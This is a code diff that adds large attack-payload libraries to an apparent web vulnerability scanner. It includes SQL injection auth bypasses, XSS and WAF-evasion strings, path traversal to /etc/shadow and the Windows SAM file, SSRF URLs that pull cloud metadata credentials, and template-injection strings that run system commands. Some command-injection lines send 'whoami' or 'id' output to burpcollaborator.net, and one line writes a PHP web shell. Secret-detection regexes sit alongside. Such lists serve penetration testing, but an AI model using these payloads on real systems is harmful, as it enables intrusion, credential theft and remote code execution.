@@ -25,6 +25,9 @@ class Config:
     # Database
     DB_URL = os.environ.get('ATOMIC_DB_URL', f'sqlite:///{BASE_DIR}/atomic_framework.db')
     
+    # GitHub API — optional token for higher rate limits (60 → 5000 req/hr)
+    GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')
+    
     # Threading
     MAX_THREADS = min(100, (os.cpu_count() or 4) * 10)
     TIMEOUT = 15
@@ -470,6 +473,407 @@ class Payloads:
         '{"query":"{__type(name:\\"User\\"){name fields{name type{name}}}}"}',
         '{"query":"query{users{id username password email}}"}',
         '{"query":"mutation{createUser(username:\\"admin\\",password:\\"admin\\",role:\\"admin\\"){id}}"}',
+    ]
+
+    # ── GitHub-style Secret Scanning Patterns ─────────────────────
+    # Regex patterns for detecting leaked secrets/tokens in HTTP
+    # responses, based on the techniques used by GitHub secret
+    # scanning. Each entry is (name, pattern_string).
+    SECRET_PATTERNS = [
+        # AWS credentials
+        ('AWS Access Key', r'(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}'),
+        ('AWS Secret Key', r'(?i)aws_?secret_?access_?key\s*[=:]\s*[A-Za-z0-9/+=]{40}'),
+        # GitHub tokens
+        ('GitHub PAT (classic)', r'ghp_[A-Za-z0-9]{36}'),
+        ('GitHub PAT (fine-grained)', r'github_pat_[A-Za-z0-9_]{82}'),
+        ('GitHub OAuth', r'gho_[A-Za-z0-9]{36}'),
+        ('GitHub App Token', r'(?:ghu|ghs)_[A-Za-z0-9]{36}'),
+        ('GitHub App Refresh', r'ghr_[A-Za-z0-9]{36,}'),
+        # Google
+        ('Google API Key', r'AIza[A-Za-z0-9_\\-]{35}'),
+        ('Google OAuth Secret', r'(?i)client_secret\s*[=:]\s*[A-Za-z0-9_\\-]{24}'),
+        # Stripe
+        ('Stripe Secret Key', r'sk_live_[A-Za-z0-9]{24,}'),
+        ('Stripe Publishable Key', r'pk_live_[A-Za-z0-9]{24,}'),
+        # Slack
+        ('Slack Bot Token', r'xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}'),
+        ('Slack Webhook', r'https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{24}'),
+        # Private keys
+        ('RSA Private Key', r'-----BEGIN RSA PRIVATE KEY-----'),
+        ('SSH Private Key', r'-----BEGIN (?:OPENSSH|DSA|EC) PRIVATE KEY-----'),
+        ('PGP Private Key', r'-----BEGIN PGP PRIVATE KEY BLOCK-----'),
+        # JWT / Bearer tokens
+        ('JWT Token', r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'),
+        ('Bearer Token', r'(?i)bearer\s+[A-Za-z0-9_\-.~+/]{20,}'),
+        # Generic API keys / passwords in config
+        ('Generic API Key', r'(?i)(?:api[_-]?key|apikey)\s*[=:]\s*["\']?[A-Za-z0-9_\-]{20,}["\']?'),
+        ('Generic Secret', r'(?i)(?:secret|password|passwd|pwd)\s*[=:]\s*["\'][^"\']{8,}["\']'),
+        # Database connection strings
+        ('Database URL', r'(?i)(?:mysql|postgres(?:ql)?|mongodb(?:\+srv)?|redis)://[^\s"\'<>]{10,}'),
+        # Heroku
+        ('Heroku API Key', r'(?i)heroku[_-]?api[_-]?key\s*[=:]\s*[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'),
+        # Twilio
+        ('Twilio API Key', r'SK[0-9a-f]{32}'),
+        # SendGrid
+        ('SendGrid API Key', r'SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}'),
+        # Mailgun
+        ('Mailgun API Key', r'key-[0-9a-zA-Z]{32}'),
+        # NPM
+        ('NPM Access Token', r'npm_[A-Za-z0-9]{36}'),
+        # PyPI
+        ('PyPI API Token', r'pypi-[A-Za-z0-9_\-]{50,}'),
+    ]
+
+    # ── GitHub Repository Best-Practice Payloads ──────────────────
+    # Curated from the most popular GitHub security repositories:
+    #   - PayloadsAllTheThings (swisskyrepo)
+    #   - SecLists (danielmiessler)
+    #   - PortSwigger/xss-cheat-sheet patterns
+    #   - sqlmap tamper-style payloads
+    #   - WafW00f WAF signatures
+    # These are integrated directly — no download or install required.
+
+    # --- Advanced SQLi Auth Bypass (from PayloadsAllTheThings) ---
+    SQLI_AUTH_BYPASS = [
+        "'-'", "' '", "'&'", "'^'", "'*'",
+        "' or ''-'", "' or '' '", "' or ''&'", "' or ''^'", "' or ''*'",
+        "'-||0#", "'-## 0#", "'-/**/0#",
+        "admin'--", "admin' #", "admin'/*",
+        "admin' or '1'='1", "admin' or '1'='1'--",
+        "admin' or '1'='1'#", "admin' or '1'='1'/*",
+        "admin' or 1=1", "admin' or 1=1--", "admin' or 1=1#",
+        "admin') or ('1'='1", "admin') or ('1'='1'--",
+        "admin') or ('1'='1'#", "admin') or 1=1--",
+        "' OR 1=1-- -", "' OR 1=1# ", "') OR 1=1-- -",
+        "') OR ('1'='1'-- -",
+        "\" or \"\"=\"", "\" or 1=1-- -", "\" or 1=1#",
+        "or 1=1", "or 1=1--", "or 1=1#", "or 1=1/*",
+        "' or 1 in (select @@version)-- -",
+        "' or 1=1 LIMIT 1-- -",
+        "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
+        "1' GROUP BY 1,2,--+",
+    ]
+
+    # --- Advanced XSS (from PortSwigger/PayloadsAllTheThings) ---
+    XSS_ADVANCED = [
+        # PortSwigger cheat-sheet derived
+        "<svg/onload=alert(1)>",
+        "<svg onload=alert`1`>",
+        "<img src=x onerror=alert(1)//>",
+        "<body onload=alert(1)>",
+        "<input onfocus=alert(1) autofocus>",
+        "<marquee onstart=alert(1)>",
+        "<video src=_ onerror=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        "<audio src onerror=alert(1)>",
+        "<isindex type=image src=1 onerror=alert(1)>",
+        "<object data=javascript:alert(1)>",
+        "<embed src=javascript:alert(1)>",
+        "<iframe srcdoc='<script>alert(1)</script>'>",
+        # Modern event handlers & contexts
+        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->",
+        "<svg><set onbegin=alert(1) attributeName=x to=1>",
+        # Template / framework specific
+        "{{constructor.constructor('return this')().alert(1)}}",
+        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
+        "{{''.__class__.__mro__[1].__subclasses__()}}",
+        # WAF-evasion XSS (case, encoding, splitting)
+        "<IMG SRC=x OnErRoR=alert(1)>",
+        "<script>alert(String.fromCharCode(88,83,83))</script>",
+        "<script>eval(atob('YWxlcnQoMSk='))</script>",
+        "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
+        "<a href=javas&#99;ript:alert(1)>click</a>",
+        # DOM-based blind XSS
+        "'\"><script src=https://xss.report/s/test></script>",
+        "'\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL3Rlc3QiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>",
+    ]
+
+    # --- Advanced LFI / Path Traversal (from PayloadsAllTheThings/SecLists) ---
+    LFI_ADVANCED = [
+        # Double encoding
+        "..%252f..%252f..%252f..%252fetc/passwd",
+        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
+        # UTF-8 overlong encoding
+        "..%c0%af..%c0%af..%c0%afetc/passwd",
+        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
+        # Null byte (PHP < 5.3.4)
+        "../../../../../../etc/passwd%00",
+        "../../../../../../etc/passwd%00.php",
+        "../../../../../../etc/passwd%00.html",
+        # PHP wrapper advanced
+        "php://filter/read=convert.base64-encode/resource=index.php",
+        "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
+        "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
+        "php://input",
+        "expect://id",
+        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+        "phar://./test.phar/test.txt",
+        # Linux interesting files
+        "/etc/shadow", "/etc/hosts", "/etc/hostname",
+        "/proc/self/environ", "/proc/self/cmdline",
+        "/proc/self/fd/0", "/proc/self/fd/1", "/proc/self/fd/2",
+        "/proc/version", "/proc/net/tcp",
+        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
+        "/var/log/nginx/access.log", "/var/log/nginx/error.log",
+        "/var/log/auth.log", "/var/log/syslog",
+        # Windows
+        "..\\..\\..\\..\\windows\\win.ini",
+        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "C:\\boot.ini", "C:\\windows\\system32\\config\\sam",
+    ]
+
+    # --- Advanced SSRF (from PayloadsAllTheThings/SecLists) ---
+    SSRF_ADVANCED = [
+        # IP obfuscation
+        "http://0x7f000001/", "http://017700000001/",
+        "http://2130706433/", "http://0x7f.0x0.0x0.0x1/",
+        "http://0177.0000.0000.0001/",
+        "http://[::ffff:127.0.0.1]/",
+        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
+        "http://127.1/", "http://127.0.1/",
+        # DNS rebinding
+        "http://spoofed.burpcollaborator.net/",
+        "http://localtest.me/",
+        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io/",
+        # URL scheme tricks
+        "gopher://127.0.0.1:25/_HELO%20localhost",
+        "dict://127.0.0.1:11211/stat",
+        "file:///etc/passwd",
+        "file:///c:/windows/win.ini",
+        "ldap://127.0.0.1/",
+        "tftp://127.0.0.1/test",
+        # Cloud metadata — extended
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://169.254.169.254/latest/user-data/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        "http://169.254.169.254/metadata/v1/",    # DigitalOcean
+        "http://100.100.100.200/latest/meta-data/", # Alibaba
+        "http://169.254.169.254/opc/v2/instance/", # Oracle
+        "http://169.254.170.2/v2/credentials",     # AWS ECS
+        "https://kubernetes.default.svc/api/v1/namespaces",
+        "https://kubernetes.default.svc/api/v1/pods",
+        # SSRF to internal services
+        "http://127.0.0.1:22/", "http://127.0.0.1:3306/",
+        "http://127.0.0.1:6379/", "http://127.0.0.1:9200/",
+        "http://127.0.0.1:11211/", "http://127.0.0.1:27017/",
+    ]
+
+    # --- Advanced Command Injection (from PayloadsAllTheThings) ---
+    CMDI_ADVANCED = [
+        # IFS-based space bypass
+        "cat${IFS}/etc/passwd", "cat$IFS/etc/passwd",
+        ";${IFS}cat${IFS}/etc/passwd",
+        # Quoting tricks
+        "c'a't /etc/passwd", 'c"a"t /etc/passwd',
+        "c\\at /etc/passwd", "/???/??t /etc/passwd",
+        # Brace expansion
+        "{cat,/etc/passwd}", "{ls,-la,/}",
+        # Variable substitution
+        "a]a]a;{cat,/etc/passwd}", "$({cat,/etc/passwd})",
+        # Encoding bypasses
+        "`echo Y2F0IC9ldGMvcGFzc3dk|base64 -d`",
+        "$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)",
+        "echo${IFS}Y2F0IC9ldGMvcGFzc3dk${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}sh",
+        # Wildcard bypass
+        "/e?c/p?sswd", "/e*/passwd",
+        "cat /etc/pass??", "cat /etc/passw*",
+        # Newline / tab injection
+        "%0aid", "%0a/bin/cat%20/etc/passwd",
+        "$'\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'",
+        # DNS / OOB
+        ";nslookup test.burpcollaborator.net",
+        ";curl http://test.burpcollaborator.net/$(whoami)",
+        "`wget http://test.burpcollaborator.net/$(id)`",
+    ]
+
+    # --- Advanced SSTI (from PayloadsAllTheThings) ---
+    SSTI_ADVANCED = [
+        # Detection
+        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
+        "{{7*'7'}}", "{{'7'*7}}", "#{7*7}",
+        # Jinja2 (Python)
+        "{{config}}", "{{config.items()}}",
+        "{{''.__class__.__mro__[2].__subclasses__()}}",
+        "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
+        "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\")}}{% endif %}{% endfor %}",
+        # Twig (PHP)
+        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+        "{{['id']|filter('system')}}",
+        # Freemarker (Java)
+        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+        # Smarty (PHP)
+        "{php}echo `id`;{/php}",
+        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
+        # Pebble (Java)
+        "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}",
+        # ERB (Ruby)
+        "<%= system('id') %>", "<%= `id` %>",
+        # Handlebars (JS)
+        "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
+    ]
+
+    # --- WAF Bypass Payload Library (from WafW00f/WAF-bypass-collection) ---
+    WAF_BYPASS_PAYLOADS = {
+        'xss_waf': [
+            "<svg/onload=alert(1)>",
+            "<img src=x onerror=alert`1`>",
+            "<details/open/ontoggle=alert`1`>",
+            "'-alert(1)-'", "\\'-alert(1)//",
+            "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
+            "<a href=\"javascript&colon;alert(1)\">click</a>",
+            "<svg><script>alert&#40;1&#41;</script>",
+            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )",
+        ],
+        'sqli_waf': [
+            "' /*!50000OR*/ 1=1-- -",
+            "' /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ 1,2,3-- -",
+            "' OR/**/ 1=1-- -",
+            "'/**/OR/**/1=1--/**/-",
+            "' /*!50000OR*/ '1'='1'-- -",
+            "'-IF(1=1,SLEEP(5),0)--+-",
+            "' AND 1=1 ORDER BY 1-- -",
+            "' UNION%23%0ASELECT 1,2,3-- -",
+            "' UNION%0D%0ASELECT 1,2,3-- -",
+            "' UN%49ON SE%4CECT 1,2,3-- -",
+        ],
+        'lfi_waf': [
+            "....//....//....//etc/passwd",
+            "..%252f..%252f..%252fetc%252fpasswd",
+            "..%c0%af..%c0%af..%c0%afetc/passwd",
+            "/..%00/..%00/..%00/etc/passwd",
+            "..\\..\\..\\..\\etc\\passwd",
+            "..%5c..%5c..%5c..%5cetc%5cpasswd",
+        ],
+        'cmdi_waf': [
+            "$(cat${IFS}/etc/passwd)",
+            ";cat${IFS}/etc/passwd",
+            "|cat<</etc/passwd",
+            "`echo${IFS}id`",
+            "a]a]a;{cat,/etc/passwd}",
+            "$'\\x63at'${IFS}'/etc/passwd'",
+        ],
+    }
+
+    # --- Content Discovery Paths (from SecLists/dirsearch/gobuster) ---
+    DISCOVERY_PATHS_EXTENDED = [
+        # Environment / config leak
+        '/.env', '/.env.bak', '/.env.local', '/.env.production',
+        '/.env.development', '/.env.staging',
+        '/config.yml', '/config.yaml', '/config.json', '/config.xml',
+        '/config.php.bak', '/config.inc', '/configuration.php',
+        '/settings.py', '/local_settings.py',
+        '/application.properties', '/application.yml',
+        '/appsettings.json', '/appsettings.Development.json',
+        '/wp-config.php', '/wp-config.php.bak', '/wp-config.php.old',
+        # VCS leak
+        '/.git/HEAD', '/.git/config', '/.git/index',
+        '/.gitignore', '/.gitattributes',
+        '/.svn/entries', '/.svn/wc.db',
+        '/.hg/hgrc', '/.hg/store',
+        '/.bzr/branch-format',
+        # Docker / Container
+        '/Dockerfile', '/docker-compose.yml', '/docker-compose.yaml',
+        '/.dockerenv',
+        # CI/CD config
+        '/.github/workflows/', '/.gitlab-ci.yml',
+        '/Jenkinsfile', '/.circleci/config.yml',
+        '/.travis.yml',
+        # Dependency files
+        '/package.json', '/package-lock.json',
+        '/yarn.lock', '/composer.json', '/composer.lock',
+        '/Gemfile', '/Gemfile.lock',
+        '/requirements.txt', '/Pipfile', '/Pipfile.lock',
+        '/go.mod', '/go.sum',
+        '/Cargo.toml', '/Cargo.lock',
+        '/pom.xml', '/build.gradle',
+        # API documentation
+        '/swagger.json', '/swagger.yaml', '/swagger-ui.html',
+        '/openapi.json', '/openapi.yaml',
+        '/api-docs', '/api/docs', '/api/swagger',
+        '/v1/api-docs', '/v2/api-docs', '/v3/api-docs',
+        '/graphql', '/graphiql', '/altair',
+        '/playground', '/__graphql',
+        # Debug / info endpoints
+        '/actuator', '/actuator/env', '/actuator/health',
+        '/actuator/info', '/actuator/mappings', '/actuator/beans',
+        '/actuator/configprops', '/actuator/trace', '/actuator/heapdump',
+        '/_debug', '/__debug__/', '/debug/pprof/',
+        '/trace', '/metrics', '/stats',
+        '/server-status', '/server-info',
+        '/elmah.axd', '/phpinfo.php',
+        '/info.php', '/test.php', '/pi.php',
+        # Admin & consoles
+        '/admin/', '/admin/login', '/admin/dashboard',
+        '/administrator/', '/manager/html',
+        '/console', '/console/', '/h2-console/',
+        '/system', '/monitoring', '/nagios',
+        # Backup files
+        '/backup.sql', '/backup.zip', '/backup.tar.gz',
+        '/db.sql', '/database.sql', '/dump.sql',
+        '/site.tar.gz', '/www.zip', '/public.zip',
+        '/old/', '/bak/', '/copy/',
+        # Error pages that leak info
+        '/404', '/500', '/error', '/errors/500',
+        '/cgi-bin/', '/cgi-bin/test-cgi',
+        # Well-known paths
+        '/.well-known/openid-configuration',
+        '/.well-known/security.txt',
+        '/.well-known/change-password',
+        '/.well-known/apple-app-site-association',
+        '/.well-known/assetlinks.json',
+    ]
+
+    # --- API Endpoint Patterns (from SecLists API wordlists) ---
+    API_ENDPOINT_PATTERNS = [
+        '/api/v1/users', '/api/v1/admin', '/api/v1/auth',
+        '/api/v1/login', '/api/v1/register', '/api/v1/token',
+        '/api/v1/refresh', '/api/v1/config', '/api/v1/settings',
+        '/api/v1/upload', '/api/v1/download', '/api/v1/export',
+        '/api/v1/import', '/api/v1/search', '/api/v1/status',
+        '/api/v2/users', '/api/v2/admin', '/api/v2/auth',
+        '/api/users', '/api/admin', '/api/auth', '/api/health',
+        '/api/token', '/api/config', '/api/settings',
+        '/api/internal', '/api/private', '/api/debug',
+        '/rest/v1/', '/rest/v2/', '/rest/api/',
+        '/graphql', '/graphql/v1',
+        '/rpc', '/jsonrpc', '/xmlrpc',
+    ]
+
+    # --- Fuzzer Extra Parameters (from Arjun/ParamSpider) ---
+    FUZZER_EXTRA_PARAMS = [
+        # Auth & session
+        'access_token', 'refresh_token', 'id_token', 'oauth_token',
+        'api_key', 'apikey', 'api_secret', 'client_id', 'client_secret',
+        'session_id', 'sessionid', 'auth_token', 'csrf_token', 'xsrf_token',
+        'nonce', 'state', 'code', 'grant_type', 'scope',
+        # File / path operations
+        'file', 'filename', 'filepath', 'path', 'dir', 'directory',
+        'folder', 'root', 'document', 'template', 'include', 'require',
+        'src', 'source', 'resource', 'assets',
+        # Network / URL
+        'url', 'uri', 'href', 'link', 'next', 'redirect', 'redirect_uri',
+        'return', 'return_url', 'returnTo', 'callback', 'continue',
+        'destination', 'forward', 'goto', 'target', 'to', 'out',
+        'rurl', 'reference', 'site',
+        # Injection points
+        'cmd', 'exec', 'command', 'execute', 'ping', 'query',
+        'jump', 'code', 'reg', 'do', 'func', 'arg', 'option',
+        'load', 'process', 'step', 'read', 'feature', 'payload',
+        # Display / debug
+        'debug', 'test', 'verbose', 'trace', 'log_level',
+        'env', 'mode', 'preview', 'dev', 'view_source',
+        'internal', 'hidden', 'private', 'show', 'display',
+        # Content
+        'content', 'body', 'text', 'html', 'xml', 'json', 'data',
+        'raw', 'input', 'output', 'message', 'comment',
+        'title', 'description', 'subject', 'bio', 'name',
+        # Sorting / filtering
+        'sort', 'order', 'orderby', 'sort_by', 'direction',
+        'filter', 'where', 'column', 'field', 'group_by',
+        'having', 'join', 'table',
     ]
 
 
